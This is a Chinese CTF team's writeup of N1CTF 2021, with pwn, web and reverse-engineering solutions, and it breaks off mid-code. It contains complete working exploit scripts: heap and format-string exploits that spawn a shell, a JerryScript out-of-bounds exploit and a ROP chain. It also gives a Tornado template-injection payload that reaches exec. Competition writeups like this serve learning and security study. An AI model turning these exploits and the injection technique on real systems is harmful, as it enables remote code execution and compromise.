# N1CTF 2021 Writeup

本次比赛我们获得了第二名的成绩

![](https://i.imgur.com/DBz5XOb.png)

现将师傅们的 wp 整理如下，分享给大家一起学习进步~ 同时也欢迎各位大佬加入 r3kapig 的大家庭，大家一起学习进步，相互分享~ 简历请投战队邮箱：root@r3kapig.com


## Pwn

### BabyFMT

修改了printf,和scanf。题目中有个fmtstr的漏洞，但是printf只剩下%r%m可以泄露，仔细看了下发现有个%\0的处理有问题会造成溢出所以泄露后把__free_hook链tache就可以getshell.

```python
from pwn import *
context.log_level='debug'
def cmd(c):
    p.sendlineafter(">",str(c).encode('utf-8'))
def add(size,author=b"a",c=b'c'):
    cmd(1)
    p.sendlineafter(":",b"Content size is "+str(size).encode('utf-8'))
    p.sendlineafter(":",b"Book author is "+author)
    p.sendlineafter(":",b"Book content is "+c)
def free(idx):
    cmd(2)
    p.sendlineafter(":",b'Book idx is '+str(idx).encode('utf-8'))
def puts(s,idx=0):
    cmd(3)
    p.sendlineafter(":",b'Book idx is '+str(idx).encode('utf-8'))
    p.sendlineafter("You can show book by yourself\n",b'My format '+s)

p=remote("43.155.72.106",9999)
#p=process("./pwn")
for x in range(9):
    add(0x68)
for x in range(1,8):
    free(x)
free(0)
for x in range(7):
    add(0x68)
add(0x1)

puts(b"%r%m%r",7)
base=u64(p.read(6)+b'\0\0')-(0x7ffff7facc61-0x7ffff7dc1000)
log.warning(hex(base))
free(5)

free(6)
puts(b'%1%\0'+b"\1"*0x5e+p64(0x1eeb28-0x10+base))

#puts(b'%\0'+b"\1"*0xb0+p64(0x1eeb28-0x10+base))
add(0x68)

#gdb.attach(p,'b *malloc')
puts(b"/bin/sh;%%%%%%%\x0011111"+p64(0x55410+base))
p.interactive()
```

### Jerry

通过 bindiff 比对，然后找到被修改的位置:

```
diff --git a/jerry-core/ecma/operations/ecma-dataview-object.c b/jerry-core/ecma/operations/ecma-dataview-object.c
index 45db1e00..0b4cac50 100644
--- a/jerry-core/ecma/operations/ecma-dataview-object.c
+++ b/jerry-core/ecma/operations/ecma-dataview-object.c
@@ -108,10 +108,10 @@ ecma_op_dataview_create (const ecma_value_t *arguments_list_p, /**< arguments li
     }
 
     /* 8.b */
-    if (offset + byte_length_to_index > buffer_byte_length)
-    {
-      return ecma_raise_range_error (ECMA_ERR_MSG ("Start offset is outside the bounds of the buffer"));
-    }
+    // if (offset + byte_length_to_index > buffer_byte_length)
+    // {
+    //   return ecma_raise_range_error (ECMA_ERR_MSG ("Start offset is outside the bounds of the buffer"));
+    // }
 
     JERRY_ASSERT (byte_length_to_index <= UINT32_MAX);
     view_byte_length = (uint32_t) byte_length_to_index;
```

删掉了一个 DataView 创建时的长度合法性检测，这意味着我们申请的 DataView 长度可以大于 ArrayBuffer，从而实现 oob。有了 oobArray 就很简单了，基本步骤：

leak elf_base → leak got → leak libc → leak stack → hijack main_ret with one_gadget

```javascript
var buffer = new ArrayBuffer(0x10)
var buffer2 = new ArrayBuffer(0x10)
data2=new DataView(buffer,0,0x100)
data=new DataView(buffer2,0,0x100)
data.setUint32(0,0x41414141)
data.setUint32(4,0x41414141)
data2.setUint32(0,0x42424242)
data2.setUint32(4,0x42424242)
jerry_gloal_heap_offset=0x68
jerry_gloal_heap=data.getUint32(jerry_gloal_heap_offset+4,true)*0x100000000+data.getUint32(jerry_gloal_heap_offset,true)
text_base=jerry_gloal_heap-0x6d480
realloc_got=text_base+0x00000000006bf00+0x10
print(jerry_gloal_heap.toString(16))
print(text_base.toString(16))
print(realloc_got.toString(16))
data.setUint32(jerry_gloal_heap_offset,realloc_got&0xffffffff,true)

libc_base=data2.getUint32(4,true)*0x100000000+data2.getUint32(0,true)-0x97b20
print(libc_base.toString(16))
env=libc_base+0x1e45a0-0x10
print(env.toString(16))
data.setUint32(jerry_gloal_heap_offset,env&0xffffffff,true)
data.setUint32(jerry_gloal_heap_offset+4,env/0x100000000,true)

stack=data2.getUint32(4,true)*0x100000000+data2.getUint32(0,true)
print(stack.toString(16))
ret_addr=stack-0x108-0x10
ogg=libc_base+[0xde78c,0xde78f,0xde792][1]
data.setUint32(jerry_gloal_heap_offset,ret_addr&0xffffffff,true)
data.setUint32(jerry_gloal_heap_offset+4,ret_addr/0x100000000,true)
data2.setUint32(0,ogg&0xffffffff,true)
data2.setUint32(4,ogg/0x100000000,true)
```

### House_of_tataru

菜单选项1不满足fail-safe的要求，可以随意修改大于0x1000的size。因为meta在heap上所以可以通过上面的那个漏洞读heap地址。然后bss上有几个freedchunk所以就可以先获得他们，之后猜一个bss和heap的偏移（最小1页最多0x2000页）然后就可以修改heap上的meta->mem，就可以通过选项1完成任意写。之后因为calloc还有exit里面都走了奇怪的分支把两个指针用任意写改掉，然后做FSOP+ROP就可以读flag，概率有点低是1/0x2000

```python
from pwn import *
def cmd(c):
    p.sendafter(":",str(c).encode('utf-8'))
def add(magic=0xff,idx=0,c=b'A'):
    cmd(1)
    p.send(p32(magic))
    p.send(p8(idx))
    if(magic<0x1000):
        p.send(c)
def leave(idx=0):
    cmd(2)
    p.send(p8(idx))
def read(c,idx=0):
    cmd(3)
    p.send(p8(idx))
    p.send(c)
def show(idx=0):
    cmd(4)
    p.send(p8(idx))


def ddd():
    global p
    print(pidof(p))
    raw_input()
import os
local=0
if(1):
    try:
        if(local):
            p=process(b"/usr/sbin/chroot --userspec=1000:1000 /home/ctf ./pwn".split(b" "))
        else:
            p=remote("43.155.68.132",23333,timeout=90)
        
        context.terminal=['tmux','split','-h']
        add(0xfff,0,b"\1")
        add(0x888,1,b'\2')
        

        add(0x1fd0,1,b'1')
        leave(1)
        show(1)
        p.read(0x30)
        heap=u64(p.read(6)+b'\0\0')-(0x55e4fd7ef1a8-0x000055e4fd7ef000)
        log.warning(hex(heap))
        context.log_level='error'
        

        add(0x38)# 


        if(local):
            pid=pidof(p)
            pid = str(pid)[1:-1]
            ccc=f"sed -n '5p' /proc/{pid}/maps"
            res=os.popen(ccc).read()[:12]
            bss = int("0x"+res,16)
            log.warning(hex(bss))
        else:
            bss = heap-0x132000
        
        target = heap-bss -0xfa0
        #log.warning(hex(target))
        add(target+0xf0)
        leave()
        
        show()
        p.read(0x30)
        base=u64(p.read(6)+b'\0\0')-(0x7efd9dcd1040-0x00007efd9dc1a000)
        
        if(base&0xfff!=0):
            exit(1)
        log.warning(hex(base))
        
        #AAR
        #add(0x80,1,p64(0xdeadbeef))
        FK = 0x7f5a39a37f80-0x7f5a39981000+base
        log.warning("Calloc Guard->"+hex(FK))
        add((0x140+heap) - (bss+0xfa0),0)
        leave()
        add((0x140+heap) - (bss+0xfa0)+0x100,0)
        
        read(p64(FK-0x30))
        add(0x80,1,p64(0)*2+p64(0xffffffffffffffff))
        
        # add(0xc0,1,p64(0xdeadbeef))#locate
        
        GUARD = 0x7fd7b6e3af20-0x7fd7b6d84000+base# exit guard
        context.log_level='debug'
        log.warning("Exit Guard->"+hex(GUARD))
        add((0x168+heap) - (bss+0xfa0),0)
        leave()
        add((0x168+heap) - (bss+0xfa0)+0x100,0)
        read(p64(GUARD-0x30))


        add(0xb0,1,p64(0).ljust(0x50,b'\0')+p64(0xffffffffffffffff)*3)
#        add(0xd0,1,p64(0xdeadbeef))# locate

        context.arch='amd64'
        rdx = 0x000000000002cdae+base
        rdi = 0x00000000000152a1+base
        rsi = 0x000000000007897d+base # rbp
        rax = 0x0000000000016a96+base
        leaver = 0x000000000007b088+base
        sys_read = 0x7f2ea1052f10-0x7f2ea0fde000+base
        sys_open = 0x7f2ea0ffda70-0x7f2ea0fde000+base
        sys_write = 0x7f2ea1053700-0x7f2ea0fde000+base
        rebase = 0x7f2ea10923f8-0x7f2ea0fde000+base
        syscall = 0x7b3f6+base
        payload = flat([
            0,0,
            0xdeadbeef,
            0x0000000000016e7e+base,
            0xb43c0+base,
            0xb43c0+base-0x40,
            0xdeadbeef,
            rsi,
            rebase,leaver,rdi,0,rdx,0x1000,sys_read,3,4,0xffffffffffffffff
        ])
        FSOP = 0xb43a0+base
        log.warning("FSOP->"+hex(FSOP))
        add((0xa0+heap) - (bss+0xfa0),0)
        leave()
        add((0xa0+heap) - (bss+0xfa0)+0x100,0)
        read(p64(FSOP-0x30))
        
        add(0xd0,1,payload)
        #ddd()
        
        cmd(5)
        rop=flat([
        rdi,rebase+0x199,rsi,0,0,rdx,0,rax,2,syscall,
        rdi,3,rsi,rebase,0,rdx,0x99,sys_read,
        rdi,1,rsi,rebase,0,rdx,0x99,sys_write
        ])
        p.send(rop.ljust(0x199,b'\0')+b"./flag\0")
        
        t=p.readuntil(b"\n")
        res=p.read()
        print(res)
        log.warning(hex(base))
        raw_input()
        
        #gdb.attach(p,'vmmap')
        p.interactive()
    except Exception:
        p.close()
```

爆出来了 属于是欧皇的胜利了

![](https://i.imgur.com/VZZ5dSY.png)

flag:n1ctf{U_Ar3_RE41LY_M43TeR_0f_Mus1!}


## Web

### Signin

写入会urldecode一次，所以将/flag url编码后变换大小写绕过date函数写入文件中，再进行读取就ok了

![](https://i.imgur.com/AZ5zikE.png)

### QQQueryyy All The Things

https://harold.kim/blog/2021/11/n1ctf-writeup/

### Easyphp

https://harold.kim/blog/2021/11/n1ctf-writeup/

### Funny_web

https://harold.kim/blog/2021/11/n1ctf-writeup/

### Tornado

题目环境：python 3.9.7, tornado 6.1

源码app.py:

```python
import tornado.ioloop
import tornado.web
import builtins
import unicodedata
import uuid
import os
import re

def filter(data):
    data = unicodedata.normalize('NFKD',data)
    if len(data) > 1024:
        return False
    if re.search(r'__|\(|\)|datetime|sys|import',data):
        return False
    for k in builtins.__dict__.keys():
        if k in data:
            return False
    return True

class IndexHandler(tornado.web.RequestHandler):
    def get(self):
        self.render("templates/index.html",)
    def post(self):
        data = self.get_argument("data")
        if not filter(data):
            self.finish("no no no")
        else:
            id = uuid.uuid4()
            f = open(f"uploads/{id}.html",'w')
            f.write(data)
            f.close()
            try:
                self.render(f"uploads/{id}.html",)
            except:
                self.finish("error")
            os.unlink(f"uploads/{id}.html")

def make_app():
    return tornado.web.Application([
        (r"/", IndexHandler),
    ],compiled_template_cache=False)

if __name__ == "__main__":
    app = make_app()
    app.listen(8888)
    tornado.ioloop.IOLoop.current().start()
```

- post的data在通过`filter()`检验之后会写入到 `uploads/{uuid}.html`，然后经过tornado的模板引擎渲染，最后删除uploads下的这个文件。
- `filter()`主要限制了data的长度，并且不允许一些关键字出现。比如网上最常见的Tornado SSTI payload:` {% import os %}{{ os.system('id') }} ` 这里的 import 就在 builtins 里，不能用

要想寻找其他执行代码的方法，先来读一下文档，看看除了 import 还有没有什么特殊的 tag：https://www.tornadoweb.org/en/stable/template.html#syntax-reference

其中 raw 和 autoescape 比较特别，前者可以返回 python 代码的执行结果，后者接收一个函数，用来对当前文件里所有 block 的输出进行编码。在 `tornado/template.py` 里可以看到它的实现：

```python
class _Expression(_Node):
    def __init__(self, expression: str, line: int, raw: bool = False) -> None:
        self.expression = expression
        self.line = line
        self.raw = raw

    def generate(self, writer: "_CodeWriter") -> None:
        writer.write_line("_tt_tmp = %s" % self.expression, self.line) # ⚠vulnerable
        writer.write_line(
            "if isinstance(_tt_tmp, _tt_string_types):" " _tt_tmp = _tt_utf8(_tt_tmp)",
            self.line,
        )
        writer.write_line("else: _tt_tmp = _tt_utf8(str(_tt_tmp))", self.line)
        if not self.raw and writer.current_template.autoescape is not None:
            # In python3 functions like xhtml_escape return unicode,
            # so we have to convert to utf8 again.
            writer.write_line(
                "_tt_tmp = _tt_utf8(%s(_tt_tmp))" % writer.current_template.autoescape, # ⚠vulnerable
                self.line,
            )
        writer.write_line("_tt_append(_tt_tmp)", self.line)
```

可以看到 raw 和 autoescape 都是直接把参数拼接到代码里执行。如果我们能在代码运行的context里找到类似 eval 或者 os 这些 function或者说module, 就能通过类似
 `{% autoescape xx.yy.zz.eval %} {{ 'print(1)' }} `

这样的方法来RCE，这相当于 `eval('print(1)')`。

怎么在context找这些函数呢，只需要在app.py的 render() 下个断点，一步一步跟,template.py拼接这些 `_tt_xxxxx` 的python代码之后总会要通过exec执行一下

比如327行这里self.code就是编译模板要执行的代码：

![](https://i.imgur.com/2WluHMI.png)

362行的 execute() 就是执行代码的地方，此时step into一次然后切到debugger的console就有对应的上下文了

![](https://i.imgur.com/P9Gwde7.png)

最终我找到了 exec：

```
{% autoescape request.server_connection._serving_future._coro.cr_frame.f_builtins['exe'+'c'] %}
{{ request.headers["z"] }}

```

把要执行的python代码放在request header里就行了:

![](https://i.imgur.com/sfoBfjG.png)

## Reverse

### Easyre

题目用到了avx指令集,整个控制流非常长,需要模拟执行来dump下来

我用的是ida自动单步来求解的

脚本


```python
import idaapi
import idautils
import ida_dbg
import time
import struct
import ida_bytes
from ctypes import *

keyreg='xmm0'
g_fp=open('flow.txt','w+')
def myexit():
    g_fp.close()
    exit()
def log_code(code):
    global g_fp
    g_fp.write(code+'\n')
    print(code)
def cvt_xmmi(s):
    a=""
    for i in s:
        a+='\\x'+hex(i)[2:]
    return 'b2m(\"'+a+'\")'
def prase_opxmmi(ip):
    global keyreg
    opreg=''
    val_idx=0
    if print_operand(ip,1)==keyreg:
        opreg=print_operand(ip,2)
        val_idx=2
    else:
        if print_operand(ip,2)!=keyreg:
            myexit()
        opreg=print_operand(ip,1)
        val_idx=1
    if opreg.find('rbp')!=-1:
        rbp_off=get_operand_value(ip,val_idx)
        rbp_off=struct.unpack('q',struct.pack('Q',rbp_off))[0]
        rbp=ida_dbg.get_reg_val('rbp')
        data_pos=rbp+rbp_off
        bdata=ida_bytes.get_bytes(data_pos,16)
        return cvt_xmmi(bdata)
    else:
        return cvt_xmmi(ida_dbg.get_reg_val(opreg))
def prase_opxmmi2(ip):
    global keyreg
    if print_operand(ip,1)!=keyreg:
        myexit()
    opreg=print_operand(ip,2)
    if opreg.find('rbp')!=-1:
        rbp_off=get_operand_value(ip,2)
        rbp_off=struct.unpack('q',struct.pack('Q',rbp_off))[0]
        rbp=ida_dbg.get_reg_val('rbp')
        data_pos=rbp+rbp_off
        bdata=ida_bytes.get_bytes(data_pos,16)
        return cvt_xmmi(bdata)
    else:
        return cvt_xmmi(ida_dbg.get_reg_val(opreg))
def prase_vpxor(ip):
    xmmi=prase_opxmmi(ip)
    log_code('dst=xorq(dst,'+xmmi+');')
def prase_vpaddq(ip):
    xmmi=prase_opxmmi(ip)
    log_code('dst=addq(dst,'+xmmi+');')
def prase_vpsubq(ip):
    global keyreg
    xmmi=prase_opxmmi(ip)
    if print_operand(ip,1)!=keyreg:
        myexit()
    else:
        log_code('dst=subq(dst,'+xmmi+');')

def prase_vaesenc(ip):
    xmmi=prase_opxmmi2(ip)
    log_code('dst=aesenc(dst,'+xmmi+');')
def prase_vaesenclast(ip):
    xmmi=prase_opxmmi2(ip)
    log_code('dst=aesenclast(dst,'+xmmi+');')
def prase_vaesdec(ip):
    xmmi=prase_opxmmi2(ip)
    log_code('dst=aesdec(dst,'+xmmi+');')
def prase_vaesdeclast(ip):
    xmmi=prase_opxmmi2(ip)
    log_code('dst=aesdeclast(dst,'+xmmi+');')
def prase_vpshufd(ip):
    _ord=hex(get_operand_value(ip,2))[2:]
    log_code('dst=pshufd(dst,0x'+_ord+');')
while(True):
    if ip == 0x7FF6C0AD88FA:
            myexit()
    ip=ida_dbg.get_reg_val("rip")
    #print(hex(ip)[2:])
    dis=GetDisasm(ip)
    mnem=print_insn_mnem(ip)
    if print_operand(ip,0)==keyreg:
        if mnem == 'vmovdqa':
            break
        if mnem == 'vpxor':
            prase_vpxor(ip)
        elif mnem == 'vpshufd':
            prase_vpshufd(ip)
        elif mnem == 'vpaddq':
            prase_vpaddq(ip)
        elif mnem == 'vpsubq':
            prase_vpsubq(ip)
        elif mnem == 'vaesenc':
            prase_vaesenc(ip)
        elif mnem == 'vaesenclast':
            prase_vaesenclast(ip)
        elif mnem == 'vaesdec':
            prase_vaesdec(ip)
        elif mnem == 'vaesdeclast':
            prase_vaesdeclast(ip)
        elif mnem == 'vaesimc':
            break
        else:
            break
        
    ida_dbg.step_over()
    ida_dbg.wait_for_next_event(ida_dbg.WFNE_SUSP,2)
```

这个脚本可以dump出原先的控制流逻辑,遇到把keyreg赋值的指令就停止,keyreg可能是xmm0或者xmm4

然后用该脚本将整个控制流翻转

```python
fp=open('newflow.txt','r')
flow_array=[]
for i in fp:
    flow_array.append(i)

print(len(flow_array))
alls=''
for i in range(0,len(flow_array)):
    line=flow_array[len(flow_array)-i-1]
    newline=line[0:6]+'re_'+line[6:]
    alls+=newline

fp.close();
fp=open('rev_flow.txt','w+')

fp.write(alls)
fp.close()
```

相关逆运算

```cpp
__m128i re_aesenc(__m128i v, __m128i k) {
    AddRoundKey(&v, &k);
    MixColumnsRe(&v);
    SubBytesRe(&v, &v, 16);
    ShiftRowsRe(&v);
    return v;
}
__m128i re_aesdec(__m128i v, __m128i k) {
    AddRoundKey(&v, &k);
    MixColumns(&v);
    SubBytes(&v, &v, 16);
    ShiftRows(&v);
    return v;
}
__m128i re_aesenclast(__m128i v, __m128i k) {
    AddRoundKey(&v, &k);
    SubBytesRe(&v, &v, 16);
    ShiftRowsRe(&v);
    return v;
}
__m128i re_aesdeclast(__m128i v, __m128i k) {
    AddRoundKey(&v, &k);
    SubBytes(&v, &v, 16);
    ShiftRows(&v);
    return v;
}
__m128i re_aesimc(__m128i v) {
    MixColumns(&v);
    return v;
}
__m128i re_pshufd(__m128i v, UCHAR ord) {
    UCHAR ord_1 = ord & 0b00000011;
    UCHAR ord_2 = (ord & 0b00001111) >> 2;
    UCHAR ord_3 = (ord & 0b00111111) >> 4;
    UCHAR ord_4 = (ord & 0b11111111) >> 6;

    int ord_off[4] = { 0 };
    ord_off[0] = ord_1;
    ord_off[1] = ord_2;
    ord_off[2] = ord_3;
    ord_off[3] = ord_4;

    int hits[4] = { 0 };
    for (int i = 0; i < 4; i++) {
        hits[ord_off[i]] = 1;
    }
    for (int i = 0; i < 4; i++) {
        if (hits[i] == 0) {
            printf("invaild pshufd ord\n");
            exit(1);
        }
    }
    __m128i result = { 0 };
    for (int i = 0; i < 4; i++) {
        ((int*)&result)[ord_off[i]] = ((int*)&v)[i];
    }
    return result;
}
__m128i re_addq(__m128i he, __m128i v2) {
    return _mm_sub_epi64(he, v2);
}
__m128i re_subq(__m128i jieguo, __m128i jianshu) {
    return _mm_add_epi64(jieguo, jianshu);
}
__m128i re_xorq(__m128i v, __m128i v2) {
    return _mm_xor_si128(v, v2);
}
__m128i b2m(const char* code) {
    return *(__m128i*)code;
}
```
把rev_flow.txt里的c代码复制到vs里编译,堆栈设置100mb即可运行
Flag :
n1ctf{Easy_AVX!}

### Hello

golang逆向

输入一串16进制数

题目先对输入做了一堆表变换，然后又检查一个线性方程组

线性方程组是模0x125意义下的，这个模操作被编译器优化成了一些乘法和减法，需要按照算术结构猜一下

```python
from sage.all import *

F = Zmod(0x125)

dats = [
    (
        5377102, 44718284, 65149487, 35629177, 16687834, 12649121, 20133359, 27627194, 8881295, 52185491, 17564837,
        1272949,
        51420184, 15249722, 40743553, 11448910, 68),
    (15513275, 48100308, 8677693, 410852, 14512921, 40946083, 11650930, 46765687, 3705469, 34235932, 37493724, 31668013,
     58592730, 35099188, 46007731, 48411728, 73),
    (51342117, 17611295, 46626798, 44419237, 41219106, 12201596, 52093804, 15752138, 20900966, 34002181, 3328881,
     9778043, 61937243, 28320092, 22952329, 11388094, 105),
    (57970260, 46862881, 45916134, 43159917, 28388843, 9676221, 36591851, 16650010, 36167240, 63801756, 45673314,
     59151919, 23972020, 38457326, 2137413, 34715169, 26),
    (32808901, 11375397, 28326782, 40013998, 40100057, 56977904, 23526593, 21483823, 56539279, 10941397, 24023407,
     66315899, 50854754, 20365833, 49899769, 65951721, 278),
    (52471216, 40551307, 47833723, 32746957, 282427, 36309373, 52604124, 63871055, 34514986, 25927713, 11073096,
     11857558, 39192608, 53262276, 8291395, 13044253, 236),
    (24199242, 37064630, 47531426, 66810519, 61739612, 62585890, 38269989, 32578112, 28922206, 17699555, 52918290,
     6761227, 30745745, 1682385, 48980070, 37348869, 261),
    (
        12966608, 34693296, 54221555, 32345456, 1903443, 34021426, 50757695, 9801829, 41831746, 45032298, 9672908,
        58876674,
        65789447, 60438120, 30396598, 62202924, 90),
    (25298698, 55027617, 63071621, 7969099, 49780363, 63670216, 50679759, 41122881, 18966262, 17349024, 2668953,
     59077744, 8593554, 34796144, 31874820, 29937890, 173),
    (
        599957, 11891252, 34874075, 32524194, 61745538, 26060497, 18424162, 53660494, 1201444, 54575969, 37180051,
        62966701,
        39797887, 16103318, 57153581, 17388834, 55),
    (
        52820893, 49623029, 9330086, 27114985, 61462529, 61723044, 8246048, 59291588, 35129803, 18108987, 7550306,
        67056908,
        31750158, 42011531, 18660303, 28288668, 229),
    (
        3226343, 63976576, 64477078, 20940616, 32271858, 8400987, 32491361, 32731509, 36725663, 1598982, 37370364,
        41009760,
        58809916, 51093211, 43880816, 21003028, 292),
    (11484407, 18322594, 31148317, 52408555, 59525552, 5235806, 6702116, 53260842, 19179549, 23703928, 20336759,
     24738818, 21200580, 63640408, 51302172, 7196185, 43),
    (28563837, 14524437, 11571592, 44514143, 42212815, 49813519, 54404660, 28977207, 50811576, 11016018, 34665752,
     57509360, 12159655, 8717460, 32686335, 34266111, 5),
    (
        33392211, 7979743, 61382021, 35672785, 22833691, 52860393, 8630338, 5700458, 44480266, 18911756, 58513213,
        27865128,
        16783819, 18997872, 24282261, 39608187, 276),
    (28529793, 61959315, 23103319, 11554134, 40628674, 31294575, 17218640, 9249973, 13077670, 50326885, 15741379,
     4029227, 886406, 55982584, 31034972, 23299004, 165),
    (2075035, 58384561, 49647471, 24338954, 30588692, 9418491, 38289933, 41390328, 43235505, 26341415, 28645103,
     50452614, 39840129, 61149522, 4371300, 32579505, 217),
    (39948186, 19156834, 31133287, 30084536, 35248885, 26835402, 25602134, 34823251, 1866553, 48298737, 52095831,
     14841955, 24081438, 52610483, 8163681, 29828862, 207),
    (620322, 1371418, 41109851, 26104149, 44652087, 52819211, 39349501, 9965987, 31002578, 31387649, 53199974, 20246162,
     16795502, 33373239, 36682310, 60508155, 1),
    (0x1d60734,0x3f49d23,0x19dcd96,0x1e6e5ea,0x3d01ef4,0xe35c9,0x240b433,0x16aa43e,0x1c13291,0x23edd00,0x2bdc439,0x25bb3fc,0x11a1801,0x2f2339b,0x5093eb,0x1ce4ecf, 0x15),
]

M = Matrix(F, dats)
y = M[:,-1]
M = M[:,:-1]
#print(M)
x = M.solve_right(y)
assert M*x == y
print(x.list())
```

解出来是 [201, 247, 36, 211, 26, 224, 241, 131, 112, 24, 2, 0, 17, 243, 56, 186]

然后需要做 func1 的逆变换
func1 总共对输入数据进行9次变换，每次以4字节为一组做如下查表操作
input 4 bytes -> ((table3 + table5) + (table4 + table5)) -> output 4 bytes

观察一下 table5 可以发现是 xor

另外 (table3+table5) 和 (table4+table5) 本质上是一样的操作，只是table3和table4数值不同

它们的约束形式都是  table[x0] ^ table[x1] ^ table[x2] ^ table[x3] = const

其中 x0,x1,x2,x3 都是 8 bit 整数，各自用的table是不同的
可以用 meet in the middle 方法来解

枚举 (x0, x1) pair，把 table[x0]^table[x1] 存到哈希表里
枚举 (x2, x3) pair，用 table[x2]^table[x3]^const 查询哈希表
就能找到正确的 x0,x1,x2,x3

```python
from typing import List
from tables import *


def re_func2(inp: List[int]):
    table = (0, 13, 10, 7, 4, 1, 14, 11, 8, 5, 2, 15, 12, 9, 6, 3)
    out = [0] * 16
    for i in range(16):
        out[i] = inp[table[i]]
    return out


def inv_table(tab, val: List[int]):
    val = (val[0] << 24) | (val[1] << 16) | (val[2] << 8) | val[3]
    t0 = dict()
    for i, x in enumerate(tab[0]):
        for j, y in enumerate(tab[1]):
            v = x ^ y
            t0[v] = (i, j)
    t1 = dict()
    for i, x in enumerate(tab[2]):
        for j, y in enumerate(tab[3]):
            v = x ^ y
            t1[v] = (i, j)
    ans = []
    for v0, pos0 in t0.items():
        v1 = v0 ^ val
        if v1 in t1:
            pos1 = t1[v1]
            ans.append([*pos0, *pos1])
    assert len(ans) == 1
    return ans[0]


def re_func1(inp: List[int]):
    inp = [t1[i].tolist().index(inp[i]) for i in range(16)]
    inp = re_func2(inp)
    for i in reversed(range(9)):
        for j in reversed(range(0, 16, 4)):
            tmp = inv_table(table4[i][j:j+4], inp[j:j+4])
            inp[j:j+4] = inv_table(table3[i][j:j+4], tmp)
        inp = re_func2(inp)
    return inp


if __name__ == "__main__":
    inp = [201, 247, 36, 211, 26, 224, 241, 131, 112, 24, 2, 0, 17, 243, 56, 186]
    print(re_func1(inp))
```

解出来是 [188, 148, 96, 177, 114, 49, 199, 227, 116, 190, 88, 116, 39, 204, 63, 26]

转成16进制

flag:inctf{bc9460b17231c7e374be587427cc3f1a}

![](https://i.imgur.com/he2Axzl.png)

### Babyrust

Rust宏定义写的一个简单vm，根据字符串的内容，对 $Never, $Gone, $Give三个变量进行变化

修改代码如下，然后编译

```rust
    (@e ($Never:expr,$Gonna:expr,$Give:expr); (Never gonna say goodbye $($code:tt)*)) => {
        $Gonna = $Never[$Give];
        println!("Gonna = Never[Give: {}]: {}", $Give, $Never[$Give]);
        check!(@e ($Never,$Gonna,$Give); ($($code)*));
    };
    (@e ($Never:expr,$Gonna:expr,$Give:expr); (Never gonna tell a lie and hurt you $($code:tt)*)) => {
        $Never[$Give] = $Gonna;
        println!("Never[Give: {}] = Gonna: {}", $Give, $Gonna);
        check!(@e ($Never,$Gonna,$Give); ($($code)*));
    };
    
    let result = check!(@s n1ctf{00000000000000000000000000000000});
```

由于只有加减法，明文与密文每一位之间的差值是固定的

```python
cipher = [148, 59, 143, 112, 121, 186, 106, 133, 55, 90, 164, 166, 167, 121, 174, 147, 148,
 167, 99, 86, 81, 161, 151, 149, 132, 56, 88, 188, 141, 127, 151, 63]
fake_cipher = [131, 53, 124, 109, 118, 165, 89, 131, 50, 83, 163, 149, 165, 104, 153, 145, 142, 149, 77, 69, 60, 154, 133, 128, 115, 54, 69, 168, 133, 105, 146, 59]
for c, f in zip(cipher, fake_cipher):
    print (chr(c - f + 48), end='')
# A6C33EA2571A2AE26BFAE7BEA2CD8F54
```

### Py

首先解elf文件，能在目录下得到两个pyc
修改文件头，`0a5n.py` 为

```python
import L
from var import *

def check_format(flag):
    if len(flag) != 28:
        return False
    for i in flag:
        if i not in '0123456789abcdef':
            return False

    return True


v1 = L.c1(v1, v2, v3)
v6 = L.c2(v1, v4, v5)
k = input('flag:')
if check_format(k) == True:
    v2 = L.f3(k)
    v3 = v2 - v6
    if v3.a2 == g1 and v3.a3 == g2:
        print('Congratulations! n1ctf{%s}' + k)
```

L.py 中有乱码，还原字节码能得到两个exec

```python
z = ''.join([chr(i ^ 2) for i in z])
exec(z)
```

实际还原出来是 <<运算，柑橘z中的数据猜测实际为^
是一个smc

```python
key = 0
libc = ctypes.CDLL("libc.so.6")
_ptrace = libc.ptrace
key=_ptrace(0, 0, 1, 0)
_memcpy = libc.memcpy
key += 1
address=id(f1.__code__.co_code)+bytes.__basicsize__-1
codes=list(f1.__code__.co_code)
for i in range(len(codes)):codes[i]^=key
codes=bytearray(codes)
buff=(ctypes.c_byte*len(codes)).from_buffer(codes)
_memcpy(ctypes.c_char_p(address),ctypes.cast(buff,ctypes.POINTER(ctypes.c_char)),ctypes.c_int(len(codes)))
```

手动patch一下pyc文件，uncompyle6反编译后自己修复一下变量名，发现很多函数的逻辑很奇怪，根据刚才异或运算被解释成了左移运算，题目中的vm可能对基础运算符的opcode进行了相互的调换

通过使用的参数和函数的形式，猜测应该是个ECC算法，对其进行还原

0a5n.py:

```python
import L
from var import *

def check_format(flag):
    if len(flag) != 28:
        return False
    for i in flag:
        if i not in '0123456789abcdef':
            return False
    return True

v1 = L.c1(v1, v2, v3)
v6 = L.c2(v1, v4, v5)
k = input('flag:')
if check_format(k) == True:
    v2 = L.f3(k)
    v3 = v2 * v6
    if v3.a2 == g1 and v3.a3 == g2:
        print('Congratulations! n1ctf{%s}' % k)
```

L.py:

```python
def inv_mod(b, p):
    if b < 0 or p <= b:
        b = b % p
    c, d = b, p
    uc, vc, ud, vd, temp = 1, 0, 0, 1, 0
    while c != 0:
        temp = c
        q, c, d = d // c, d % c, temp
        uc, vc, ud, vd = ud - q * uc, vd - q * vc, uc, vc

    assert d == 1
    if ud > 0:
        return ud
    else:
        return ud + p

def leftmost_bit(x):
    assert x > 0
    result = 1
    while result <= x:
        result = 2 * result
    return result // 2

class Curve(object):  # c1

    def __init__(self, p, a, b):
        var4 = p
        var4 ^= 0x10000000000000000000000000000000000000000L
        self.p = var4
        var5 = a
        var5 -= 1
        var5 //= 2
        self.a = var5
        var6 = b
        var6 //= 2
        var6 += 1
        self.b = var6

    def s1(self, x, y):  # 判断是否在曲线上
        return (y * y) - (x * x * x + self.a * x + self.b) % self.p == 0


class Point(object):   # c2

    def __init__(self, curve: Curve, x, y, order=None):
        self.curve = curve
        self.x = x
        self.y = y
        self.order = order
        if self.a1:
            assert self.a1.s1(x, y)
        if order:
            assert self * order == g1

    def __eq__(self, other):
        if self.curve == other.curve and self.x == other.x and self.y == other.y:
            return True
        else:
            return False

    def __add__(self, other):
        if other == g1:
            return self
        if self == g1:
            return other
        assert self.curve == other.curve
        if self.x == other.x:
            if (self.y + other.y) % self.curve.p == 0:
                return g1
            return self.s1()
        p = self.curve.p
        l = other.y % self.y - inv_mod(other.x % self.x, p) + p
        x3 = (l * l - self.x - other.x) % p
        y3 = (l * (self.x - x3) - self.y) % p
        return Point(self.curve, x3, y3)

    def __mul__(self, other):
        e = other
        if self.order:
            e = e + self.order
        if e == 0:
            return g1
        if self == g1:
            return g1
        e3 = 3 * e
